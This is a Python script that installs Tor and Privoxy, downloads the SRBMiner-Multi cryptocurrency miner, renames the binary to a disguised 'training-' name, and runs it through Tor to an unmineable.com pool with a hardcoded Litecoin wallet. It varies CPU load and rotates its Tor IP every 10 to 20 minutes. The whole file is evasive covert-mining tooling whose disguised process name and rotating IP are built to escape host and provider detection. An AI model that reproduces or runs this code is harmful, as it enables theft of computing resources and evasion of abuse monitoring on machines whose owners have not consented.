import subprocess
import secrets
import shutil
import os
import time
import random
from pathlib import Path
from stem import Signal
from stem.control import Controller

# Constants
VERSION = "1.0.0"  # Replace with the latest SRBMiner-Multi version
WORK_DIR = Path.home() / "work"
SRBMiner_DIR = WORK_DIR / f"SRBMiner-Multi-{VERSION}"
POOL = "stratum+ssl://ghostrider.unmineable.com:443"
USERNAME = "LTC:LTHZzHREhbJkP8vDyUCxqvz1yReBqEC2q8.CPU-GhostRider-Multi#mo4y-tkdg"
ALGO = "ghostrider"
TOR_PORT = 9051
PRIVOXY_PORT = 9050

# Helper function to run shell commands
def run_command(command):
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running command {command}: {e}")
        return False
    return True

# Install Tor and Privoxy
def install_tor_privoxy():
    return run_command(["apt-get", "install", "-y", "tor", "privoxy"])

# Configure Privoxy
def configure_privoxy():
    try:
        privoxy_config_path = "/etc/privoxy/config"
        forward_socks = f"forward-socks5t / 127.0.0.1:{PRIVOXY_PORT} .\n"
        with open(privoxy_config_path, "r+") as config_file:
            config_lines = config_file.readlines()
            if forward_socks not in config_lines:
                config_file.write(forward_socks)
        return True
    except Exception as e:
        print(f"Error configuring Privoxy: {e}")
        return False

# Configure Tor
def configure_tor():
    try:
        torrc_path = "/etc/tor/torrc"
        settings = ["ControlPort 9051\n", "SocksTimeout 60\n"]
        with open(torrc_path, "r+") as torrc_file:
            config_lines = torrc_file.readlines()
            for setting in settings:
                if setting not in config_lines:
                    torrc_file.write(setting)
        return True
    except Exception as e:
        print(f"Error configuring Tor: {e}")
        return False

# Restart Tor and Privoxy services
def restart_services():
    return run_command(["systemctl", "restart", "tor"]) and run_command(["systemctl", "restart", "privoxy"])

# Download SRBMiner-Multi
def download_srbminer():
    url = f"https://github.com/doktor83/SRBMiner-Multi/releases/download/v{VERSION}/SRBMiner-Multi-{VERSION}-Linux.tar.xz"
    return run_command(["wget", url, "-P", str(WORK_DIR)])

# Extract SRBMiner-Multi
def extract_srbminer():
    tar_file = WORK_DIR / f"SRBMiner-Multi-{VERSION}-Linux.tar.xz"
    return run_command(["tar", "-xvf", str(tar_file), "-C", str(WORK_DIR)])

# Rename SRBMiner-Multi to a random name
def rename_srbminer():
    srbminer_path = SRBMiner_DIR / "SRBMiner-Multi"
    random_name = f"training-{secrets.randbelow(375)}-{secrets.randbelow(259)}"
    new_path = WORK_DIR / random_name
    shutil.move(str(srbminer_path), str(new_path))
    return new_path

# Set executable permissions for SRBMiner-Multi
def set_permissions(srbminer_path):
    os.chmod(str(srbminer_path), 0o755)

# Renew IP via Tor
def renew_connection():
    with Controller.from_port(port=TOR_PORT) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)

# Run SRBMiner-Multi through Tor with random CPU usage
def run_srbminer(srbminer_path):
    # Choose a random CPU usage value from 70 to 90
    cpu_hint = random.randint(70, 90)

    srbminer_cmd = [
        "torsocks", str(srbminer_path),
        "--algorithm", ALGO,
        "--pool", POOL,
        "--wallet", USERNAME,
        "--cpu-priority", str(cpu_hint),  # Adjust CPU usage
    ]

    print(f"Running SRBMiner-Multi with {cpu_hint}% CPU.")
    return subprocess.Popen(srbminer_cmd)

# Stop SRBMiner-Multi
def stop_srbminer(srbminer_process):
    srbminer_process.terminate()
    srbminer_process.wait()

# Main function
def main():
    if not (install_tor_privoxy() and configure_privoxy() and configure_tor() and restart_services()):
        print("Error occurred during installation or configuration.")
        return

    print("Tor and Privoxy have been installed and configured successfully.")
    WORK_DIR.mkdir(parents=True, exist_ok=True)

    if download_srbminer() and extract_srbminer():
        srbminer_path = rename_srbminer()
        set_permissions(srbminer_path)

        while True:
            # Run SRBMiner-Multi with random CPU usage from 70 to 90%
            srbminer_process = run_srbminer(srbminer_path)

            # Sleep for a random time between 10 to 20 minutes
            sleep_time = random.randint(600, 1200)  # Random from 600s (10 minutes) to 1200s (20 minutes)
            print(f"Waiting {sleep_time // 60} minutes before changing IP...")
            time.sleep(sleep_time)

            # Change IP and restart SRBMiner-Multi with a new random CPU usage
            renew_connection()  # Request Tor to change IP
            stop_srbminer(srbminer_process)

if __name__ == "__main__":
    main()
